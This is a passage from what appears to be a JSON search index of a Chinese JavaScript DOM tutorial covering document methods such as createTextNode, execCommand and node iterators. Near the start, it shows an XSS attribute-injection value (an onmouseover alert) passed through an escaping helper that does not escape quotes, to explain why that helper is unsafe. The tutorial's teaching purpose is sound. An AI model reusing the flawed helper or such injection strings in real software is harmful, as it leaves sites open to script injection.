\u4ee3\u7801\u6e32\u67d3\u3002\u56e0\u6b64\uff0c\u53ef\u4ee5\u7528\u6765\u5c55\u793a\u7528\u6237\u7684\u8f93\u5165\uff0c\u907f\u514d XSS \u653b\u51fb\u3002 1 2 3 4 var div = document . createElement ( 'div' ); div . appendChild ( document . createTextNode ( '<span>Foo & bar</span>' )); console . log ( div . innerHTML ) // &lt;span&gt;Foo &amp; bar&lt;/span&gt; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c createTextNode \u65b9\u6cd5\u5bf9\u5927\u4e8e\u53f7\u548c\u5c0f\u4e8e\u53f7\u8fdb\u884c\u8f6c\u4e49\uff0c\u4ece\u800c\u4fdd\u8bc1\u5373\u4f7f\u7528\u6237\u8f93\u5165\u7684\u5185\u5bb9\u5305\u542b\u6076\u610f\u4ee3\u7801\uff0c\u4e5f\u80fd\u6b63\u786e\u663e\u793a\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8be5\u65b9\u6cd5\u4e0d\u5bf9\u5355\u5f15\u53f7\u548c\u53cc\u5f15\u53f7\u8f6c\u4e49\uff0c\u6240\u4ee5\u4e0d\u80fd\u7528\u6765\u5bf9 HTML \u5c5e\u6027\u8d4b\u503c\u3002 1 2 3 4 5 6 7 8 9 10 11 function escapeHtml(str) { var div = document.createElement('div'); div.appendChild(document.createTextNode(str)); return div.innerHTML; }; var userWebsite = '\" onmouseover=\"alert(\\'derp\\')\" \"'; var profileLink = ' < a href = \"' + escapeHtml(userWebsite) + '\" > Bob </ a > '; var div = document.getElementById('target'); div.innerHTML = profileLink; // < a href = \"\" onmouseover = \"alert('derp')\" \"\" > Bob </ a > \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7531\u4e8e createTextNode \u65b9\u6cd5\u4e0d\u8f6c\u4e49\u53cc\u5f15\u53f7\uff0c\u5bfc\u81f4 onmouseover \u65b9\u6cd5\u88ab\u6ce8\u5165\u4e86\u4ee3\u7801\u3002","title":"document.createTextNode()"},{"location":"dom/document/#documentcreateattribute","text":"document.createAttribute \u65b9\u6cd5\u751f\u6210\u4e00\u4e2a\u65b0\u7684\u5c5e\u6027\u8282\u70b9\uff08 Attr \u5b9e\u4f8b\uff09\uff0c\u5e76\u8fd4\u56de\u5b83\u3002 1 var attribute = document . createAttribute ( name ); document.createAttribute \u65b9\u6cd5\u7684\u53c2\u6570 name \uff0c\u662f\u5c5e\u6027\u7684\u540d\u79f0\u3002 1 2 3 4 5 6 7 8 var node = document . getElementById ( 'div1' ); var a = document . createAttribute ( 'my_attrib' ); a . value = 'newVal' ; node . setAttributeNode ( a ); // \u6216\u8005 node . setAttribute ( 'my_attrib' , 'newVal' ); \u4e0a\u9762\u4ee3\u7801\u4e3a div1 \u8282\u70b9\uff0c\u63d2\u5165\u4e00\u4e2a\u503c\u4e3a newVal \u7684 my_attrib \u5c5e\u6027\u3002","title":"document.createAttribute()"},{"location":"dom/document/#documentcreatecomment","text":"document.createComment \u65b9\u6cd5\u751f\u6210\u4e00\u4e2a\u65b0\u7684\u6ce8\u91ca\u8282\u70b9\uff0c\u5e76\u8fd4\u56de\u8be5\u8282\u70b9\u3002 1 var CommentNode = document . createComment ( data ); document.createComment \u65b9\u6cd5\u7684\u53c2\u6570\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u4f1a\u6210\u4e3a\u6ce8\u91ca\u8282\u70b9\u7684\u5185\u5bb9\u3002","title":"document.createComment()"},{"location":"dom/document/#documentcreatedocumentfragment","text":"document.createDocumentFragment \u65b9\u6cd5\u751f\u6210\u4e00\u4e2a\u7a7a\u7684\u6587\u6863\u7247\u6bb5\u5bf9\u8c61\uff08 DocumentFragment \u5b9e\u4f8b\uff09\u3002 1 var docFragment = document . createDocumentFragment (); DocumentFragment \u662f\u4e00\u4e2a\u5b58\u5728\u4e8e\u5185\u5b58\u7684 DOM \u7247\u6bb5\uff0c\u4e0d\u5c5e\u4e8e\u5f53\u524d\u6587\u6863\uff0c\u5e38\u5e38\u7528\u6765\u751f\u6210\u4e00\u6bb5\u8f83\u590d\u6742\u7684 DOM \u7ed3\u6784\uff0c\u7136\u540e\u518d\u63d2\u5165\u5f53\u524d\u6587\u6863\u3002\u8fd9\u6837\u505a\u7684\u597d\u5904\u5728\u4e8e\uff0c\u56e0\u4e3a DocumentFragment \u4e0d\u5c5e\u4e8e\u5f53\u524d\u6587\u6863\uff0c\u5bf9\u5b83\u7684\u4efb\u4f55\u6539\u52a8\uff0c\u90fd\u4e0d\u4f1a\u5f15\u53d1\u7f51\u9875\u7684\u91cd\u65b0\u6e32\u67d3\uff0c\u6bd4\u76f4\u63a5\u4fee\u6539\u5f53\u524d\u6587\u6863\u7684 DOM \u6709\u66f4\u597d\u7684\u6027\u80fd\u8868\u73b0\u3002 1 2 3 4 5 6 7 8 9 10 var docfrag = document . createDocumentFragment (); [ 1 , 2 , 3 , 4 ]. forEach ( function ( e ) { var li = document . createElement ( 'li' ); li . textContent = e ; docfrag . appendChild ( li ); }); var element = document . getElementById ( 'ul' ); element . appendChild ( docfrag ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6587\u6863\u7247\u65ad docfrag \u5305\u542b\u56db\u4e2a <li> \u8282\u70b9\uff0c\u8fd9\u4e9b\u5b50\u8282\u70b9\u88ab\u4e00\u6b21\u6027\u63d2\u5165\u4e86\u5f53\u524d\u6587\u6863\u3002","title":"document.createDocumentFragment()"},{"location":"dom/document/#documentcreateevent","text":"document.createEvent \u65b9\u6cd5\u751f\u6210\u4e00\u4e2a\u4e8b\u4ef6\u5bf9\u8c61\uff08 Event \u5b9e\u4f8b\uff09\uff0c\u8be5\u5bf9\u8c61\u53ef\u4ee5\u88ab element.dispatchEvent \u65b9\u6cd5\u4f7f\u7528\uff0c\u89e6\u53d1\u6307\u5b9a\u4e8b\u4ef6\u3002 1 var event = document . createEvent ( type ); document.createEvent \u65b9\u6cd5\u7684\u53c2\u6570\u662f\u4e8b\u4ef6\u7c7b\u578b\uff0c\u6bd4\u5982 UIEvents \u3001 MouseEvents \u3001 MutationEvents \u3001 HTMLEvents \u3002 1 2 3 4 5 6 var event = document . createEvent ( 'Event' ); event . initEvent ( 'build' , true , true ); document . addEventListener ( 'build' , function ( e ) { console . log ( e . type ); // \"build\" }, false ); document . dispatchEvent ( event ); \u4e0a\u9762\u4ee3\u7801\u65b0\u5efa\u4e86\u4e00\u4e2a\u540d\u4e3a build \u7684\u4e8b\u4ef6\u5b9e\u4f8b\uff0c\u7136\u540e\u89e6\u53d1\u8be5\u4e8b\u4ef6\u3002","title":"document.createEvent()"},{"location":"dom/document/#documentaddeventlistenerdocumentremoveeventlistenerdocumentdispatchevent","text":"\u8fd9\u4e09\u4e2a\u65b9\u6cd5\u7528\u4e8e\u5904\u7406 document \u8282\u70b9\u7684\u4e8b\u4ef6\u3002\u5b83\u4eec\u90fd\u7ee7\u627f\u81ea EventTarget \u63a5\u53e3\uff0c\u8be6\u7ec6\u4ecb\u7ecd\u53c2\u89c1\u300aEventTarget \u63a5\u53e3\u300b\u4e00\u7ae0\u3002 1 2 3 4 5 6 7 8 9 // \u6dfb\u52a0\u4e8b\u4ef6\u76d1\u542c\u51fd\u6570 document . addEventListener ( 'click' , listener , false ); // \u79fb\u9664\u4e8b\u4ef6\u76d1\u542c\u51fd\u6570 document . removeEventListener ( 'click' , listener , false ); // \u89e6\u53d1\u4e8b\u4ef6 var event = new Event ( 'click' ); document . dispatchEvent ( event );","title":"document.addEventListener()\uff0cdocument.removeEventListener()\uff0cdocument.dispatchEvent()"},{"location":"dom/document/#documenthasfocus","text":"document.hasFocus \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5f53\u524d\u6587\u6863\u4e4b\u4e2d\u662f\u5426\u6709\u5143\u7d20\u88ab\u6fc0\u6d3b\u6216\u83b7\u5f97\u7126\u70b9\u3002 1 var focused = document . hasFocus (); \u6ce8\u610f\uff0c\u6709\u7126\u70b9\u7684\u6587\u6863\u5fc5\u5b9a\u88ab\u6fc0\u6d3b\uff08active\uff09\uff0c\u53cd\u4e4b\u4e0d\u6210\u7acb\uff0c\u6fc0\u6d3b\u7684\u6587\u6863\u672a\u5fc5\u6709\u7126\u70b9\u3002\u6bd4\u5982\uff0c\u7528\u6237\u70b9\u51fb\u6309\u94ae\uff0c\u4ece\u5f53\u524d\u7a97\u53e3\u8df3\u51fa\u4e00\u4e2a\u65b0\u7a97\u53e3\uff0c\u8be5\u65b0\u7a97\u53e3\u5c31\u662f\u6fc0\u6d3b\u7684\uff0c\u4f46\u662f\u4e0d\u62e5\u6709\u7126\u70b9\u3002","title":"document.hasFocus()"},{"location":"dom/document/#documentadoptnodedocumentimportnode","text":"document.adoptNode \u65b9\u6cd5\u5c06\u67d0\u4e2a\u8282\u70b9\u53ca\u5176\u5b50\u8282\u70b9\uff0c\u4ece\u539f\u6765\u6240\u5728\u7684\u6587\u6863\u6216 DocumentFragment \u91cc\u9762\u79fb\u9664\uff0c\u5f52\u5c5e\u5f53\u524d document \u5bf9\u8c61\uff0c\u8fd4\u56de\u63d2\u5165\u540e\u7684\u65b0\u8282\u70b9\u3002\u63d2\u5165\u7684\u8282\u70b9\u5bf9\u8c61\u7684 ownerDocument \u5c5e\u6027\uff0c\u4f1a\u53d8\u6210\u5f53\u524d\u7684 document \u5bf9\u8c61\uff0c\u800c parentNode \u5c5e\u6027\u662f null \u3002 1 2 var node = document . adoptNode ( externalNode ); document . appendChild ( node ); \u6ce8\u610f\uff0c document.adoptNode \u65b9\u6cd5\u53ea\u662f\u6539\u53d8\u4e86\u8282\u70b9\u7684\u5f52\u5c5e\uff0c\u5e76\u6ca1\u6709\u5c06\u8fd9\u4e2a\u8282\u70b9\u63d2\u5165\u65b0\u7684\u6587\u6863\u6811\u3002\u6240\u4ee5\uff0c\u8fd8\u8981\u518d\u7528 appendChild \u65b9\u6cd5\u6216 insertBefore \u65b9\u6cd5\uff0c\u5c06\u65b0\u8282\u70b9\u63d2\u5165\u5f53\u524d\u6587\u6863\u6811\u3002 document.importNode \u65b9\u6cd5\u5219\u662f\u4ece\u539f\u6765\u6240\u5728\u7684\u6587\u6863\u6216 DocumentFragment \u91cc\u9762\uff0c\u62f7\u8d1d\u67d0\u4e2a\u8282\u70b9\u53ca\u5176\u5b50\u8282\u70b9\uff0c\u8ba9\u5b83\u4eec\u5f52\u5c5e\u5f53\u524d document \u5bf9\u8c61\u3002\u62f7\u8d1d\u7684\u8282\u70b9\u5bf9\u8c61\u7684 ownerDocument \u5c5e\u6027\uff0c\u4f1a\u53d8\u6210\u5f53\u524d\u7684 document \u5bf9\u8c61\uff0c\u800c parentNode \u5c5e\u6027\u662f null \u3002 1 var node = document . importNode ( externalNode , deep ); document.importNode \u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5916\u90e8\u8282\u70b9\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5bf9\u5916\u90e8\u8282\u70b9\u662f\u6df1\u62f7\u8d1d\u8fd8\u662f\u6d45\u62f7\u8d1d\uff0c\u9ed8\u8ba4\u662f\u6d45\u62f7\u8d1d\uff08false\uff09\u3002\u867d\u7136\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u53ef\u9009\u7684\uff0c\u4f46\u662f\u5efa\u8bae\u603b\u662f\u4fdd\u7559\u8fd9\u4e2a\u53c2\u6570\uff0c\u5e76\u8bbe\u4e3a true \u3002 \u6ce8\u610f\uff0c document.importNode \u65b9\u6cd5\u53ea\u662f\u62f7\u8d1d\u5916\u90e8\u8282\u70b9\uff0c\u8fd9\u65f6\u8be5\u8282\u70b9\u7684\u7236\u8282\u70b9\u662f null \u3002\u4e0b\u4e00\u6b65\u8fd8\u5fc5\u987b\u5c06\u8fd9\u4e2a\u8282\u70b9\u63d2\u5165\u5f53\u524d\u6587\u6863\u6811\u3002 1 2 3 4 var iframe = document . getElementsByTagName ( 'iframe' )[ 0 ]; var oldNode = iframe . contentWindow . document . getElementById ( 'myNode' ); var newNode = document . importNode ( oldNode , true ); document . getElementById ( \"container\" ). appendChild ( newNode ); \u4e0a\u9762\u4ee3\u7801\u4ece iframe \u7a97\u53e3\uff0c\u62f7\u8d1d\u4e00\u4e2a\u6307\u5b9a\u8282\u70b9 myNode \uff0c\u63d2\u5165\u5f53\u524d\u6587\u6863\u3002","title":"document.adoptNode()\uff0cdocument.importNode()"},{"location":"dom/document/#documentcreatenodeiterator","text":"document.createNodeIterator \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5b50\u8282\u70b9\u904d\u5386\u5668\u3002 1 2 3 4 var nodeIterator = document . createNodeIterator ( document . body , NodeFilter . SHOW_ELEMENT ); \u4e0a\u9762\u4ee3\u7801\u8fd4\u56de <body> \u5143\u7d20\u5b50\u8282\u70b9\u7684\u904d\u5386\u5668\u3002 document.createNodeIterator \u65b9\u6cd5\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u6240\u8981\u904d\u5386\u7684\u6839\u8282\u70b9\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a\u6240\u8981\u904d\u5386\u7684\u8282\u70b9\u7c7b\u578b\uff0c\u8fd9\u91cc\u6307\u5b9a\u4e3a\u5143\u7d20\u8282\u70b9\uff08 NodeFilter.SHOW_ELEMENT \uff09\u3002\u51e0\u79cd\u4e3b\u8981\u7684\u8282\u70b9\u7c7b\u578b\u5199\u6cd5\u5982\u4e0b\u3002 \u6240\u6709\u8282\u70b9\uff1aNodeFilter.SHOW_ALL \u5143\u7d20\u8282\u70b9\uff1aNodeFilter.SHOW_ELEMENT \u6587\u672c\u8282\u70b9\uff1aNodeFilter.SHOW_TEXT \u8bc4\u8bba\u8282\u70b9\uff1aNodeFilter.SHOW_COMMENT document.createNodeIterator \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u201c\u904d\u5386\u5668\u201d\u5bf9\u8c61\uff08 NodeFilter \u5b9e\u4f8b\uff09\u3002\u8be5\u5b9e\u4f8b\u7684 nextNode() \u65b9\u6cd5\u548c previousNode() \u65b9\u6cd5\uff0c\u53ef\u4ee5\u7528\u6765\u904d\u5386\u6240\u6709\u5b50\u8282\u70b9\u3002 1 2 3 4 5 6 7 var nodeIterator = document . createNodeIterator ( document . body ); var pars = []; var currentNode ; while ( currentNode = nodeIterator . nextNode ()) { pars . push ( currentNode ); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4f7f\u7528\u904d\u5386\u5668\u7684 nextNode \u65b9\u6cd5\uff0c\u5c06\u6839\u8282\u70b9\u7684\u6240\u6709\u5b50\u8282\u70b9\uff0c\u4f9d\u6b21\u8bfb\u5165\u4e00\u4e2a\u6570\u7ec4\u3002 nextNode \u65b9\u6cd5\u5148\u8fd4\u56de\u904d\u5386\u5668\u7684\u5185\u90e8\u6307\u9488\u6240\u5728\u7684\u8282\u70b9\uff0c\u7136\u540e\u4f1a\u5c06\u6307\u9488\u79fb\u5411\u4e0b\u4e00\u4e2a\u8282\u70b9\u3002\u6240\u6709\u6210\u5458\u904d\u5386\u5b8c\u6210\u540e\uff0c\u8fd4\u56de null \u3002 previousNode \u65b9\u6cd5\u5219\u662f\u5148\u5c06\u6307\u9488\u79fb\u5411\u4e0a\u4e00\u4e2a\u8282\u70b9\uff0c\u7136\u540e\u8fd4\u56de\u8be5\u8282\u70b9\u3002 1 2 3 4 5 6 7 8 9 var nodeIterator = document . createNodeIterator ( document . body , NodeFilter . SHOW_ELEMENT ); var currentNode = nodeIterator . nextNode (); var previousNode = nodeIterator . previousNode (); currentNode === previousNode // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c currentNode \u548c previousNode \u90fd\u6307\u5411\u540c\u4e00\u4e2a\u7684\u8282\u70b9\u3002 \u6ce8\u610f\uff0c\u904d\u5386\u5668\u8fd4\u56de\u7684\u7b2c\u4e00\u4e2a\u8282\u70b9\uff0c\u603b\u662f\u6839\u8282\u70b9\u3002 1 pars [ 0 ] === document . body // true","title":"document.createNodeIterator()"},{"location":"dom/document/#documentcreatetreewalker","text":"document.createTreeWalker \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a DOM \u7684\u5b50\u6811\u904d\u5386\u5668\u3002\u5b83\u4e0e document.createNodeIterator \u65b9\u6cd5\u57fa\u672c\u662f\u7c7b\u4f3c\u7684\uff0c\u533a\u522b\u5728\u4e8e\u5b83\u8fd4\u56de\u7684\u662f TreeWalker \u5b9e\u4f8b\uff0c\u540e\u8005\u8fd4\u56de\u7684\u662f NodeIterator \u5b9e\u4f8b\u3002\u53e6\u5916\uff0c\u5b83\u7684\u7b2c\u4e00\u4e2a\u8282\u70b9\u4e0d\u662f\u6839\u8282\u70b9\u3002 document.createTreeWalker \u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u6240\u8981\u904d\u5386\u7684\u6839\u8282\u70b9\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u6307\u5b9a\u6240\u8981\u904d\u5386\u7684\u8282\u70b9\u7c7b\u578b\uff08\u4e0e document.createNodeIterator \u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u76f8\u540c\uff09\u3002 1 2 3 4 5 6 7 8 9 10 var treeWalker = document . createTreeWalker ( document . body , NodeFilter . SHOW_ELEMENT ); var nodeList = []; while ( treeWalker . nextNode ()) { nodeList . push ( treeWalker . currentNode ); } \u4e0a\u9762\u4ee3\u7801\u904d\u5386 <body> \u8282\u70b9\u4e0b\u5c5e\u7684\u6240\u6709\u5143\u7d20\u8282\u70b9\uff0c\u5c06\u5b83\u4eec\u63d2\u5165 nodeList \u6570\u7ec4\u3002","title":"document.createTreeWalker()"},{"location":"dom/document/#documentexeccommanddocumentquerycommandsupporteddocumentquerycommandenabled","text":"\uff081\uff09document.execCommand() \u5982\u679c document.designMode \u5c5e\u6027\u8bbe\u4e3a on \uff0c\u90a3\u4e48\u6574\u4e2a\u6587\u6863\u7528\u6237\u53ef\u7f16\u8f91\uff1b\u5982\u679c\u5143\u7d20\u7684 contenteditable \u5c5e\u6027\u8bbe\u4e3a true \uff0c\u90a3\u4e48\u8be5\u5143\u7d20\u53ef\u7f16\u8f91\u3002\u8fd9\u4e24\u79cd\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u4f7f\u7528 document.execCommand() \u65b9\u6cd5\uff0c\u6539\u53d8\u5185\u5bb9\u7684\u6837\u5f0f\uff0c\u6bd4\u5982 document.execCommand('bold') \u4f1a\u4f7f\u5f97\u5b57\u4f53\u52a0\u7c97\u3002 1 document . execCommand ( command , showDefaultUI , input ) \u8be5\u65b9\u6cd5\u63a5\u53d7\u4e09\u4e2a\u53c2\u6570\u3002 command \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u6240\u8981\u5b9e\u65bd\u7684\u6837\u5f0f\u3002 showDefaultUI \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u662f\u5426\u8981\u4f7f\u7528\u9ed8\u8ba4\u7684\u7528\u6237\u754c\u9762\uff0c\u5efa\u8bae\u603b\u662f\u8bbe\u4e3a false \u3002 input \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8be5\u6837\u5f0f\u7684\u8f85\u52a9\u5185\u5bb9\uff0c\u6bd4\u5982\u751f\u6210\u8d85\u7ea7\u94fe\u63a5\u65f6\uff0c\u8fd9\u4e2a\u53c2\u6570\u5c31\u662f\u6240\u8981\u94fe\u63a5\u7684\u7f51\u5740\u3002\u5982\u679c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u8bbe\u4e3a true \uff0c\u90a3\u4e48\u6d4f\u89c8\u5668\u4f1a\u5f39\u51fa\u63d0\u793a\u6846\uff0c\u8981\u6c42\u7528\u6237\u5728\u63d0\u793a\u6846\u8f93\u5165\u8be5\u53c2\u6570\u3002\u4f46\u662f\uff0c\u4e0d\u662f\u6240\u6709\u6d4f\u89c8\u5668\u90fd\u652f\u6301\u8fd9\u6837\u505a\uff0c\u4e3a\u4e86\u517c\u5bb9\u6027\uff0c\u8fd8\u662f\u9700\u8981\u81ea\u5df1\u90e8\u7f72\u83b7\u53d6\u8fd9\u4e2a\u53c2\u6570\u7684\u65b9\u5f0f\u3002 1 2 3 4 5 var url = window . prompt ( '\u8bf7\u8f93\u5165\u7f51\u5740' ); if ( url ) { document . execCommand ( 'createlink' , false , url ); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5148\u63d0\u793a\u7528\u6237\u8f93\u5165\u6240\u8981\u94fe\u63a5\u7684\u7f51\u5740\uff0c\u7136\u540e\u624b\u52a8\u751f\u6210\u8d85\u7ea7\u94fe\u63a5\u3002\u6ce8\u610f\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f false \uff0c\u8868\u793a\u6b64\u65f6\u4e0d\u9700\u8981\u81ea\u52a8\u5f39\u51fa\u63d0\u793a\u6846\u3002 document.execCommand() \u7684\u8fd4\u56de\u503c\u662f\u4e00\u4e2a\u5e03\u5c14\u503c\u3002\u5982\u679c\u4e3a false \uff0c\u8868\u793a\u8fd9\u4e2a\u65b9\u6cd5\u65e0\u6cd5\u751f\u6548\u3002 \u8fd9\u4e2a\u65b9\u6cd5\u5927\u90e8\u5206\u60c5\u51b5\u4e0b\uff0c\u53ea\u5bf9\u9009\u4e2d\u7684\u5185\u5bb9\u751f\u6548\u3002\u5982\u679c\u6709\u591a\u4e2a\u5185\u5bb9\u53ef\u7f16\u8f91\u533a\u57df\uff0c\u90a3\u4e48\u53ea\u5bf9\u5f53\u524d\u7126\u70b9\u6240\u5728\u7684\u5143\u7d20\u751f\u6548\u3002 document.execCommand() \u65b9\u6cd5\u53ef\u4ee5\u6267\u884c\u7684\u6837\u5f0f\u6539\u53d8\u6709\u5f88\u591a\u79cd\uff0c\u4e0b\u9762\u662f\u5176\u4e2d\u7684\u4e00\u4e9b\uff1abold\u3001insertLineBreak\u3001selectAll\u3001createLink\u3001insertOrderedList\u3001subscript\u3001delete\u3001insertUnorderedList\u3001superscript\u3001formatBlock\u3001insertParagraph\u3001undo\u3001forwardDelete\u3001insertText\u3001unlink\u3001insertImage\u3001italic\u3001unselect\u3001insertHTML\u3001redo\u3002\u8fd9\u4e9b\u503c\u90fd\u53ef\u4ee5\u7528\u4f5c\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u5b83\u4eec\u7684\u542b\u4e49\u4e0d\u96be\u4ece\u5b57\u9762\u4e0a\u770b\u51fa\u6765\u3002 \uff082\uff09document.queryCommandSupported() document.queryCommandSupported() \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u6d4f\u89c8\u5668\u662f\u5426\u652f\u6301 document.execCommand() \u7684\u67d0\u4e2a\u547d\u4ee4\u3002 1 2 3 if ( document . queryCommandSupported ( 'SelectAll' )) { console . log ( '\u6d4f\u89c8\u5668\u652f\u6301\u9009\u4e2d\u53ef\u7f16\u8f91\u533a\u57df\u7684\u6240\u6709\u5185\u5bb9' ); } \uff083\uff09document.queryCommandEnabled() document.queryCommandEnabled() \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5f53\u524d\u662f\u5426\u53ef\u7528 document.execCommand() \u7684\u67d0\u4e2a\u547d\u4ee4\u3002\u6bd4\u5982\uff0c bold \uff08\u52a0\u7c97\uff09\u547d\u4ee4\u53ea\u6709\u5b58\u5728\u6587\u672c\u9009\u4e2d\u65f6\u624d\u53ef\u7528\uff0c\u5982\u679c\u6ca1\u6709\u9009\u4e2d\u6587\u672c\uff0c\u5c31\u4e0d\u53ef\u7528\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 // HTML \u4ee3\u7801\u4e3a // <input type=\"button\" value=\"Copy\" onclick=\"doCopy()\"> function doCopy (){ // \u6d4f\u89c8\u5668\u662f\u5426\u652f\u6301 copy \u547d\u4ee4\uff08\u9009\u4e2d\u5185\u5bb9\u590d\u5236\u5230\u526a\u8d34\u677f\uff09 if ( document . queryCommandSupported ( 'copy' )) { copyText ( '\u4f60\u597d' ); } else { console . log ( '\u6d4f\u89c8\u5668\u4e0d\u652f\u6301' ); } } function copyText ( text ) { var input = document . createElement ( 'textarea' ); document . body . appendChild ( input ); input . value = text ; input . focus (); input . select (); // \u5f53\u524d\u662f\u5426\u6709\u9009\u4e2d\u6587\u5b57 if ( document . queryCommandEnabled ( 'copy' )) { var success = document . execCommand ( 'copy' ); input . remove (); console . log ( 'Copy Ok' ); } else { console . log ( 'queryCommandEnabled is false' ); } } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5148\u5224\u65ad\u6d4f\u89c8\u5668\u662f\u5426\u652f\u6301 copy \u547d\u4ee4\uff08\u5141\u8bb8\u53ef\u7f16\u8f91\u533a\u57df\u7684\u9009\u4e2d\u5185\u5bb9\uff0c\u590d\u5236\u5230\u526a\u8d34\u677f\uff09\uff0c\u5982\u679c\u652f\u6301\uff0c\u5c31\u65b0\u5efa\u4e00\u4e2a\u4e34\u65f6\u6587\u672c\u6846\uff0c\u91cc\u9762\u5199\u5165\u5185\u5bb9\u201c\u4f60\u597d\u201d\uff0c\u5e76\u5c06\u5176\u9009\u4e2d\u3002\u7136\u540e\uff0c\u5224\u65ad\u662f\u5426\u9009\u4e2d\u6210\u529f\uff0c\u5982\u679c\u6210\u529f\uff0c\u5c31\u5c06\u201c\u4f60\u597d\u201d\u590d\u5236\u5230\u526a\u8d34\u677f\uff0c\u518d\u5220\u9664\u90a3\u4e2a\u4e34\u65f6\u6587\u672c\u6846\u3002","title":"document.execCommand()\uff0cdocument.queryCommandSupported()\uff0cdocument.queryCommandEnabled()"},{"location":"dom/document/#documentgetselection","text":"\u8fd9\u4e2a\u65b9\u6cd5\u6307\u5411 window.getSelection() \uff0c\u53c2\u89c1 window \u5bf9\u8c61\u4e00\u8282\u7684\u4ecb\u7ecd\u3002","title":"document.getSelection()"},{"location":"dom/element/","text":"Element \u8282\u70b9 \u00b6 \u7b80\u4ecb \u00b6 Element \u8282\u70b9\u5bf9\u8c61\u5bf9\u5e94\u7f51\u9875\u7684 HTML \u5143\u7d20\u3002\u6bcf\u4e00\u4e2a HTML \u5143\u7d20\uff0c\u5728 DOM \u6811\u4e0a\u90fd\u4f1a\u8f6c\u5316\u6210\u4e00\u4e2a Element \u8282\u70b9\u5bf9\u8c61\uff08\u4ee5\u4e0b\u7b80\u79f0\u5143\u7d20\u8282\u70b9\uff09\u3002 \u5143\u7d20\u8282\u70b9\u7684 nodeType \u5c5e\u6027\u90fd\u662f 1 \u3002 1 2 3 var p = document . querySelector ( 'p' ); p . nodeName // \"P\" p . nodeType // 1 Element \u5bf9\u8c61\u7ee7\u627f\u4e86 Node \u63a5\u53e3\uff0c\u56e0\u6b64 Node \u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u5728 Element \u5bf9\u8c61\u90fd\u5b58\u5728\u3002 \u6b64\u5916\uff0c\u4e0d\u540c\u7684 HTML \u5143\u7d20\u5bf9\u5e94\u7684\u5143\u7d20\u8282\u70b9\u662f\u4e0d\u4e00\u6837\u7684\uff0c\u6d4f\u89c8\u5668\u4f7f\u7528\u4e0d\u540c\u7684\u6784\u9020\u51fd\u6570\uff0c\u751f\u6210\u4e0d\u540c\u7684\u5143\u7d20\u8282\u70b9\uff0c\u6bd4\u5982 <a> \u5143\u7d20\u7684\u6784\u9020\u51fd\u6570\u662f HTMLAnchorElement() \uff0c <button> \u662f HTMLButtonElement() \u3002\u56e0\u6b64\uff0c\u5143\u7d20\u8282\u70b9\u4e0d\u662f\u4e00\u79cd\u5bf9\u8c61\uff0c\u800c\u662f\u8bb8\u591a\u79cd\u5bf9\u8c61\uff0c\u8fd9\u4e9b\u5bf9\u8c61\u9664\u4e86\u7ee7\u627f Element \u5bf9\u8c61\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\uff0c\u8fd8\u6709\u5404\u81ea\u72ec\u6709\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u3002 \u5b9e\u4f8b\u5c5e\u6027 \u00b6 \u5143\u7d20\u7279\u6027\u7684\u76f8\u5173\u5c5e\u6027 \u00b6 \uff081\uff09Element.id Element.id \u5c5e\u6027\u8fd4\u56de\u6307\u5b9a\u5143\u7d20\u7684 id \u5c5e\u6027\uff0c\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 1 2 3 // HTML \u4ee3\u7801\u4e3a <p id=\"foo\"> var p = document . querySelector ( 'p' ); p . id // \"foo\" \u6ce8\u610f\uff0c id \u5c5e\u6027\u7684\u503c\u662f\u5927\u5c0f\u5199\u654f\u611f\uff0c\u5373\u6d4f\u89c8\u5668\u80fd\u6b63\u786e\u8bc6\u522b <p id=\"foo\"> \u548c <p id=\"FOO\"> \u8fd9\u4e24\u4e2a\u5143\u7d20\u7684 id \u5c5e\u6027\uff0c\u4f46\u662f\u6700\u597d\u4e0d\u8981\u8fd9\u6837\u547d\u540d\u3002 \uff082\uff09Element.tagName Element.tagName \u5c5e\u6027\u8fd4\u56de\u6307\u5b9a\u5143\u7d20\u7684\u5927\u5199\u6807\u7b7e\u540d\uff0c\u4e0e nodeName \u5c5e\u6027\u7684\u503c\u76f8\u7b49\u3002 1 2 3 4 5 // HTML\u4ee3\u7801\u4e3a // <span id=\"myspan\">Hello</span> var span = document . getElementById ( 